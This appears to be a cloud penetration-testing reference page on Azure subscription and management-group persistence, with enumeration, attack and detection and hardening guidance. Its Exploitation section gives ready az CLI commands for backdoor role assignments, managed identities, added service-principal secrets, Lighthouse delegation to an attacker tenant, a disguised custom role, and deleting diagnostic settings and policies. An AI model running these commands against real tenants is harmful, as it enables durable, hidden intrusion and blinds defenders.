---
cstg_id: CSTG-AZURE-SUBSCRIPTIONS-PERSIST
title: "AZURE Subscriptions - Persistence"
provider: azure
service: subscriptions
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.Authorization/roleDefinitions/write"
  - "Microsoft.Authorization/denyAssignments/read"
  - "Microsoft.ManagedServices/registrationAssignments/write"
  - "Microsoft.Management/managementGroups/write"
  - "Microsoft.Authorization/policyAssignments/write"
  - "Microsoft.Authorization/locks/write"
  - "Microsoft.Insights/diagnosticSettings/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/write"
references:
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments"
  - "https://learn.microsoft.com/en-us/azure/lighthouse/concepts/architecture"
  - "https://learn.microsoft.com/en-us/azure/governance/management-groups/overview"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview"
  - "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings"
  - "https://learn.microsoft.com/en-us/azure/governance/policy/concepts/effects"
  - "https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

This page covers **persistence** mechanisms at the Azure subscription and management-group layer: ways an attacker who has reached control of a subscription (or higher) retains durable access that survives credential rotation, incident response, and routine cleanup. Subscription-layer persistence is especially dangerous because it is anchored to long-lived structures — role assignments, custom roles, cross-tenant delegations, and the management-group hierarchy — rather than to a single account, so revoking the originally compromised identity does not necessarily remove it.

Subscription-layer persistence follows several patterns: (1) **standing role assignments** to attacker-controlled principals (especially at management-group scope so they survive across many subscriptions); (2) **backdoor identities** — user-assigned managed identities or service principals granted roles that the attacker can re-acquire tokens for; (3) **cross-tenant delegation** via Azure Lighthouse, granting an attacker-controlled managing tenant standing access that is nearly invisible in the victim's normal role views; (4) **custom roles** designed to look benign while carrying escalation actions; and (5) **defense degradation** — disabling diagnostic settings, weakening policy, and placing locks to blind and obstruct responders. Each mechanism is detailed below.

The escalation that grants the access to plant these mechanisms is in [azure-subscriptions-privesc.md](../03-privilege-escalation/azure-subscriptions-privesc.md); directory-side persistence (app credentials, federated identity, admin units) is in [azure-entra-id-persistence.md](azure-entra-id-persistence.md).

## Prerequisites

An authenticated principal holding the write primitives below at a subscription or management-group scope — typically achieved after the escalation phase. Most mechanisms require `Microsoft.Authorization/roleAssignments/write` (or `roleDefinitions/write`); the Lighthouse mechanism requires `Microsoft.ManagedServices/registrationAssignments/write`; defense-degradation requires the relevant diagnostic/policy/lock write actions. A valid ARM token in the target subscription/management group, and ideally control of a second principal or tenant to anchor persistence to (so it survives loss of the original foothold).

## Enumeration

Before planting persistence, an assessor inventories existing assignments and defenses so additions blend in and so existing artifacts can be (ab)used:

```bash
az role assignment list --scope /subscriptions/<subId> --all -o json   # naming/scoping to mimic
az role definition list --custom-role-only true -o json                # existing custom roles
az identity list -o json                                               # existing user-assigned MIs
az rest --method get --url \
  "https://management.azure.com/subscriptions/<subId>/providers/Microsoft.ManagedServices/registrationAssignments?api-version=2022-10-01"
az monitor diagnostic-settings subscription list --query "value[].name" -o tsv
az policy assignment list --scope /subscriptions/<subId> -o json
```

## Misconfigurations & Findings

- Role assignments to **obscure or look-alike principals** (service principals named like platform tooling) at subscription or management-group scope.
- **Custom roles** with innocuous names ("support", "monitoring") carrying `Microsoft.Authorization/roleAssignments/write` or `*` — a re-escalation foothold even after direct Owner grants are removed.
- **User-assigned managed identities** the attacker created and assigned roles to, attachable to any compute the attacker controls to re-mint tokens.
- **Azure Lighthouse delegations** to an external managing tenant — standing cross-tenant access not shown in the subscription's ordinary "Access control (IAM)" assignment list, frequently overlooked during cleanup.
- **Disabled or narrowed diagnostic settings** at subscription scope, or deleted Log Analytics/Storage destinations — blinds defenders to the attacker's continued activity.
- **Policy assignments weakened** to permit the attacker's actions, and **resource locks placed** by the attacker to obstruct removal of their persistence artifacts.

## Exploitation

### Standing role assignment to a controlled principal (management-group anchored)

The simplest durable persistence is a role assignment to a principal the attacker controls — a service principal, a backdoor user, or a managed identity — placed at the **highest scope** so it survives per-subscription cleanup and spans the estate.

```bash
# Assign Owner/Contributor at MANAGEMENT-GROUP scope to a controlled service principal
az role assignment create \
  --assignee <attacker-controlled-spId> \
  --role "Owner" \
  --scope /providers/Microsoft.Management/managementGroups/<mgGroupId>
```

Because RBAC inherits downward, this single assignment grants access to every current and future child subscription. Naming the principal to resemble legitimate automation reduces the chance of removal.

### Backdoor user-assigned managed identity

Create a **user-assigned managed identity**, grant it privileged roles, and leave it available to attach to any compute resource later. Re-acquiring access requires only attaching the identity to a controlled VM/Function and minting its token — no stored secret to rotate.

```bash
az identity create --name platform-agent --resource-group <rg>
az role assignment create --assignee <uami-principalId> --role "Contributor" \
  --scope /subscriptions/<subId>
# Later: attach to controlled compute and mint a token from IMDS / IDENTITY_ENDPOINT
```

### Backdoor service principal credential

Adding a fresh credential (secret or certificate) to an existing or attacker-created service principal that holds subscription roles provides non-interactive, MFA-free re-entry. Directory-side detail is in [azure-entra-id-persistence.md](azure-entra-id-persistence.md); the subscription-layer hook is the role assignment binding that SP to the subscription/management group.

```bash
az ad sp credential reset --id <appId> --append   # add an additional secret (keeps existing)
az role assignment create --assignee <spId> --role "Owner" --scope /subscriptions/<subId>
```

### Cross-tenant delegation via Azure Lighthouse

A Lighthouse **registration assignment** grants an attacker-controlled **managing tenant** RBAC over the subscription. This is among the stealthiest persistence mechanisms: the delegated access does not appear in the subscription's normal role-assignment (IAM) blade the way in-tenant assignments do, it survives deletion of every in-tenant attacker account, and it is exercised from an entirely separate tenant the victim does not administer.

```bash
az deployment sub create --location <region> \
  --template-file lighthouse-delegation.json \
  --parameters managedByTenantId=<attacker-tenant> \
               authorizations='[{"principalId":"<attacker-principal>","roleDefinitionId":"<Owner-GUID>"}]'
```

Removal requires explicitly identifying and deleting the registration assignment and definition.

### Stealthy custom role for re-escalation

Define a **custom role** whose name implies a benign function but whose Actions include `Microsoft.Authorization/roleAssignments/write` (or `*`), assignable across the management group/subscription. Even if responders strip the attacker's Owner grants, possession of this role (assigned to a low-profile controlled principal) lets the attacker re-grant itself anything.

```bash
az role definition create --role-definition '{
  "Name": "Cost Monitoring Operator",
  "Actions": ["Microsoft.Authorization/roleAssignments/write","*/read"],
  "AssignableScopes": ["/providers/Microsoft.Management/managementGroups/<mgGroupId>"]
}'
```

### Defense degradation (blinding and obstruction)

To extend dwell time, the attacker weakens the controls that would surface or remove its persistence: deleting or narrowing subscription **diagnostic settings** (so Activity Logs stop flowing to the SIEM), weakening **Azure Policy** that would block its actions, and placing **resource locks** on its own persistence artifacts to obstruct cleanup.

```bash
# Stop subscription Activity Logs from reaching the central workspace
az monitor diagnostic-settings subscription delete --name <existingSetting>

# Weaken a guardrail policy
az policy assignment delete --name <blockingAssignment> --scope /subscriptions/<subId>

# Lock the attacker's own resources against deletion
az lock create --name keep --lock-type CanNotDelete \
  --resource-group <rg> --resource-name platform-agent \
  --resource-type Microsoft.ManagedIdentity/userAssignedIdentities
```

## Detection & Logging

- **Azure Activity Logs** record every persistence write: role assignment creation at subscription/management-group scope, custom role definition create/update, user-assigned identity creation, Lighthouse registration-assignment write, policy assignment changes, lock creation, and — critically — **diagnostic-setting deletion/modification**. The deletion of a subscription diagnostic setting is itself a high-fidelity tampering alert; ensure it is captured *before* the sink is removed (alerting at the SIEM and via Activity Log Alerts that fire on the operation).
- **Microsoft Entra ID audit logs** record the directory side: service-principal credential additions, new app registrations, guest invitations, and role activations. Sudden new credentials on a service principal that holds subscription roles is a strong persistence signal. **Sign-in logs** reveal the later use of those credentials and of managing-tenant principals (Lighthouse).
- **Lighthouse** persistence is visible as a registration-assignment write in the managed subscription's Activity Log and thereafter as activity attributed to foreign-tenant object IDs — defenders must specifically enumerate `Microsoft.ManagedServices/registrationAssignments` because it is not in the standard IAM view.
- Managed detections: **Microsoft Defender for Cloud** and **Microsoft Sentinel** ship analytics for new privileged role assignments, custom-role changes, new credentials on privileged service principals, diagnostic-setting tampering, and new Lighthouse delegations. Alert on any management-group-scope assignment and on log-pipeline changes outside change windows.

## Remediation & Hardening

- Run **periodic reconciliation** of role assignments at subscription and management-group scope against an approved baseline; treat any unexplained Owner/UAA assignment — especially at management-group scope or to a service principal/managed identity — as suspect. Use **Entra ID Access Reviews**.
- Audit **custom roles** for `Microsoft.Authorization/roleAssignments/write` and wildcard Actions regardless of role name; restrict `roleDefinitions/write`.
- Inventory **user-assigned managed identities** and **service-principal credentials**; remove unrecognized ones and rotate/limit credential lifetimes; prefer managed identities and federated credentials over long-lived secrets.
- Enumerate and govern **Azure Lighthouse** delegations explicitly (they are not in the IAM blade); alert on new registration assignments and remove delegations to unrecognized managing tenants.
- Protect the **logging pipeline**: lock and monitor subscription diagnostic settings and their destinations; configure **Activity Log Alerts** that fire on diagnostic-setting delete/update and on policy/lock changes; ensure the SIEM ingestion is resilient to a single subscription being silenced.
- Apply guardrail **Azure Policy in `Deny`** at management-group scope to prevent unauthorized role assignments / external-principal grants, and restrict `policyAssignments/write` and `Microsoft.Authorization/locks/*`.
- Enforce **PIM** for high-value roles so standing privilege (the substrate most persistence relies on) is minimized and all activations are logged and time-bound.

## Tools

- **Azure CLI / Azure PowerShell** for role-assignment, custom-role, managed-identity, policy, lock, and diagnostic-setting operations.
- **ARM REST client** for Lighthouse registration-assignment creation and enumeration not surfaced in the IAM blade.
- **Azure Resource Graph** to baseline and re-audit assignments, custom roles, and identities across all subscriptions for detection.
- **Microsoft Graph API** clients for service-principal credential and guest-account persistence.
- **Effective-access / drift-detection tooling** that diffs the current assignment/role/delegation state against an approved baseline.

## References

- Role assignments — https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments
- Azure Lighthouse architecture — https://learn.microsoft.com/en-us/azure/lighthouse/concepts/architecture
- Management groups overview — https://learn.microsoft.com/en-us/azure/governance/management-groups/overview
- Managed identities overview — https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
- Diagnostic settings — https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings
- Azure Policy effects — https://learn.microsoft.com/en-us/azure/governance/policy/concepts/effects
- Role Assignments Create REST API — https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/
